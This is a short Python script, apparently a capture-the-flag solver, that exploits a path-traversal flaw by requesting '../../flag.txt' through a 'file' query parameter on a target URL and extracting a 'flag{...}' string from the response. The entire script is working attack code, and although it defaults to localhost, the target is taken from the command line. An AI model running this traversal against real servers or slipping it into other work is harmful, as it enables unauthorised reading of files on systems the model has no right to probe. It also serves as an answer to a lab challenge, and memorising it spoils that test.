import sys
import re
import urllib.request
import urllib.parse

def main():
    # Default local testing URL
    target = "http://localhost:9091"
    if len(sys.argv) > 1:
        target = sys.argv[1]
        
    print(f"[*] Target URL: {target}")
    
    # Path traversal payload to retrieve /flag.txt from /app/exhibits
    payload = "../../flag.txt"
    
    # Construct URL with query parameters
    url = f"{target.rstrip('/')}/?{urllib.parse.urlencode({'file': payload})}"
    
    print(f"[*] Requesting URL: {url}")
    try:
        req = urllib.request.Request(url, method='GET')
        with urllib.request.urlopen(req) as response:
            html = response.read().decode('utf-8')
            
            # Find flag matching the standard pattern flag{...}
            flag_match = re.search(r"flag\{[a-zA-Z0-9_\-]+\}", html)
            if flag_match:
                print(f"[+] Exploit successful!")
                print(f"[+] Recovered Flag: {flag_match.group(0)}")
                sys.exit(0)
            else:
                print("[-] Target page loaded but no flag matching the pattern 'flag{...}' was found in the response.")
                sys.exit(1)
    except Exception as e:
        print(f"[-] Connection or request failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
